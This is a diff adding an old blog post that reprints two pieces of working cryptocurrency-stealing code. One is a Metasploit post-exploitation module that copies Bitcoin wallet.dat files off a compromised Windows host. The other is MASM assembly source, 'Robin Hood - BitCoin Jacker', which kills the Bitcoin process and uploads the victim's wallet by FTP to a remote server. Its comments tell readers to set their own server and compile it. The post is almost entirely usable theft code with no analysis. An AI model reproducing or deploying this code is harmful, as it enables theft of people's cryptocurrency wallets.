@@ -1,0 +1,216 @@
+---
+layout: post
+title: Robin Hood Bitcoin Jacker
+date: '2011-07-11T21:12:00.003+01:00'
+author: insurgencymod
+tags:
+- Insurgency Mod Scum
+- OT-Bitcoin
+modified_time: '2012-08-04T07:39:37.680+01:00'
+blogger_id: tag:blogger.com,1999:blog-7256856399250838035.post-370149794748225667
+blogger_orig_url: http://insurgencymod.blogspot.com/2011/07/robin-hood-bitcoin-jacker.html
+---
+
+<a href="http://dev.metasploit.com/redmine/projects/framework/repository/revisions/12993/entry/modules/post/windows/gather/bitcoin_jacker.rb">http://dev.metasploit.com/redmine/projects/framework/repository/revisions/12993/entry/modules/post/windows/gather/bitcoin_jacker.rb</a><br />
+<br />
+<a name='more'></a><blockquote># $Id: bitcoin_jacker.rb 12993 2011-06-21 03:26:07Z hdm $<br />
+<br />
+##<br />
+# This file is part of the Metasploit Framework and may be subject to<br />
+# redistribution and commercial restrictions. Please see the Metasploit<br />
+# Framework web site for more information on licensing and terms of use.<br />
+# http://metasploit.com/framework/<br />
+##<br />
+<br />
+require 'msf/core'<br />
+require 'rex'<br />
+<br />
+<br />
+class Metasploit3 &lt; Msf::Post  include Msf::Auxiliary::Report   def initialize(info={})   super( update_info( info,     'Name'          =&gt; 'Windows Gather Bitcoin wallet.dat',<br />
+'Description'   =&gt; %q{ This module downloads any Bitcoin wallet.dat files from the target system},<br />
+'License'       =&gt; MSF_LICENSE,<br />
+'Author'        =&gt; [ 'illwill <illwill@illmob.org>'],<br />
+'Version'       =&gt; '$Revision: 12993 $',<br />
+'Platform'      =&gt; [ 'windows' ],<br />
+'SessionTypes'  =&gt; [ 'meterpreter' ]<br />
+))<br />
+end<br />
+<br />
+def run<br />
+print_status("Checking All Users For Bitcoin Wallet...")<br />
+os = session.sys.config.sysinfo['OS']<br />
+drive = session.fs.file.expand_path("%SystemDrive%")<br />
+<br />
+if os =~ /Windows 7|Vista|2008/<br />
+@appdata = '\\AppData\\Roaming\\'<br />
+@users = drive + '\\Users'<br />
+else<br />
+@appdata = '\\Application Data\\'<br />
+@users = drive + '\\Documents and Settings'<br />
+end<br />
+<br />
+get_users<br />
+<br />
+@userpaths.each do |path|<br />
+jack_wallet(path)<br />
+end<br />
+end<br />
+<br />
+def jack_wallet(path)<br />
+data     = ""<br />
+filename = "#{path}#{@appdata}\\Bitcoin\\wallet.dat"<br />
+found    = client.fs.file.stat(filename) rescue nil<br />
+return if not found<br />
+<br />
+print_status("Wallet Found At #{filename}")<br />
+print_status("     Jackin their wallet...")<br />
+<br />
+kill_bitcoin<br />
+<br />
+begin<br />
+wallet = session.fs.file.new(filename, "rb")<br />
+until wallet.eof?<br />
+data &lt;&lt; wallet.read     end        store_loot("bitcoin.wallet", "application/octet-stream", session, data, filename, "Bitcoin Wallet")    print_status("     Wallet Jacked.")   rescue ::Interrupt     raise $!   rescue ::Exception =&gt; e<br />
+print_error("Failed to download #{filename}: #{e.class} #{e}") <br />
+end<br />
+end<br />
+<br />
+def get_users<br />
+@userpaths = []<br />
+session.fs.dir.foreach(@users) do |path|<br />
+next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/<br />
+@userpaths &lt;&lt; "#{@users}\\#{path}\\"   end  end       def kill_bitcoin   client.sys.process.get_processes().each do |x|    if x['name'].downcase == "bitcoin.exe"     print_status("     #{x['name']} Process Found...")     print_status("     Killing Process ID #{x['pid']}...")     session.sys.process.kill(x['pid']) rescue nil    end   end  end  end </illwill@illmob.org></blockquote><br />
+<a href="http://forums.gothack.net/showthread.php?18-Bitcion-Stealer">http://forums.gothack.net/showthread.php?18-Bitcion-Stealer</a><br />
+<a href="http://illmob.org/Sources/RobinHood.html">http://illmob.org/Sources/RobinHood.html</a><br />
+<br />
+<blockquote>;  ::Click Here Download Source Here:: <br />
+; Robin Hood - BitCoin Jacker <br />
+; by [ill]will <br />
+; steal from the rich and give to the poor <br />
+; by dumping the wallet to "public" ftp <br />
+; <br />
+; Send Me Money if it makes you rich :D <br />
+; 14P9t8ceqRzvJ4KhMWnjKQ4TwcLxWwk7j4 <br />
+; 'randomize' proc found somewhere on the net <br />
+; ftp.microsoft.com does not let you upload files <br />
+; so change the info and compile with MASM <br />
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; <br />
+<br />
+include \masm32\include\masm32rt.inc <br />
+include \masm32\include\wininet.inc <br />
+includelib \masm32\lib\wininet.lib <br />
+<br />
+FTPit          PROTO :DWORD,:DWORD,:DWORD <br />
+KillMe       PROTO :DWORD <br />
+Randomize    PROTO <br />
+Random       PROTO :DWORD <br />
+ThePort      equ     21 <br />
+<br />
+.data <br />
+ftpsite         db "ftp.microsoft.com",0          ;change the server <br />
+Username        db "anonymous",0      ;change the username <br />
+Password        db "bitcoin@microsoft.com",0   ;change the password <br />
+szTheVictim   db "bitcoin.exe",0 <br />
+RandWallet    db "%s-wallet.dat",0 <br />
+AppData         db "AppData",0 <br />
+wallet   db "%s\Bitcoin\wallet.dat",0 <br />
+random_seed     dd ? <br />
+res        dd 0 <br />
+sFmt       db '%u',0 <br />
+sBuf       db 10 dup(0) <br />
+<br />
+<br />
+.data? <br />
+buffer        db MAX_PATH dup(?) <br />
+WalletPath     db 256  dup(?) <br />
+WalletFTP      db 256  dup(?) <br />
+szBuffer       db 256  dup(?) <br />
+<br />
+.code <br />
+<br />
+start: <br />
+<br />
+invoke  KillMe, addr szTheVictim                ;kill the bitcoin process <br />
+invoke  Randomize                      ;generate a random number <br />
+invoke  Random,9999999 <br />
+mov     res,EAX <br />
+invoke  wsprintf,ADDR sBuf,ADDR sFmt,res             ;append it to our ftp upload filename <br />
+invoke  wsprintf,addr WalletFTP,addr RandWallet, addr sBuf       ;ex: 9586293-wallet.dat <br />
+<br />
+invoke  GetEnvironmentVariable, addr AppData, addr buffer, sizeof buffer ;get the %AppDATA% folder <br />
+invoke  wsprintf,addr WalletPath,addr wallet, addr buffer       ;append the bitcoin wallet <br />
+<br />
+invoke  FTPit, addr ftpsite, addr WalletPath,addr WalletFTP       ; send that shit to a public ftp <br />
+invoke  ExitProcess, 0 <br />
+<br />
+<br />
+<br />
+FTPit PROC FTPserver:DWORD, lpszFile:DWORD, lpRemoteFile:DWORD <br />
+local hInternet:DWORD <br />
+local ftpHandle:DWORD <br />
+local context:DWORD <br />
+local InternetStatusCallback:DWORD <br />
+invoke InternetOpen,NULL,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0 <br />
+mov hInternet, eax <br />
+invoke InternetConnect,hInternet,FTPserver,ThePort ,\   ;if different port change INTERNET_DEFAULT_FTP_PORT to port # <br />
+ADDR Username,ADDR Password,INTERNET_SERVICE_FTP,\ <br />
+INTERNET_FLAG_PASSIVE,ADDR context <br />
+mov ftpHandle,eax <br />
+invoke FtpPutFile,ftpHandle,lpszFile,lpRemoteFile,FTP_TRANSFER_TYPE_BINARY,NULL <br />
+invoke InternetCloseHandle,ftpHandle <br />
+invoke InternetCloseHandle, hInternet <br />
+ret <br />
+err: <br />
+invoke GetErrDescription,eax <br />
+ret <br />
+FTPit endp <br />
+<br />
+<br />
+<br />
+Random proc dwBase:dword <br />
+push    ebx  <br />
+mov  eax,dwBase  <br />
+xor  ebx,ebx  <br />
+imul    edx,random_seed,08088405h  <br />
+inc  edx  <br />
+mov  random_seed,edx  <br />
+mul  edx  <br />
+mov  eax,edx  <br />
+pop  ebx  <br />
+ret <br />
+Random endp <br />
+<br />
+Randomize proc  <br />
+invoke  GetTickCount <br />
+mov  random_seed,eax  <br />
+ret <br />
+Randomize endp <br />
+<br />
+KillMe proc szFile:dword <br />
+LOCAL Process:PROCESSENTRY32 <br />
+<br />
+mov Process.dwSize, sizeof Process <br />
+invoke CreateToolhelp32Snapshot, 2, 0 <br />
+mov esi, eax <br />
+invoke Process32First, esi, addr Process <br />
+@@loop:    <br />
+invoke lstrcmpiA,szFile, addr Process.szExeFile <br />
+test eax, eax <br />
+jnz @@continue <br />
+invoke OpenProcess, 0001h, 0, Process.th32ProcessID <br />
+invoke TerminateProcess, eax, 0 <br />
+@@continue: <br />
+invoke Process32Next, esi, addr Process <br />
+test eax, eax <br />
+jz @@done <br />
+jmp @@loop <br />
+@@done: <br />
+invoke CloseHandle, esi <br />
+ret <br />
+KillMe endp <br />
+<br />
+<br />
+end start </blockquote> 
+<br> 
+<br> 
+IMSIDE7ADE1ED317F5048EB80799AB02FAC8C3391FD46 
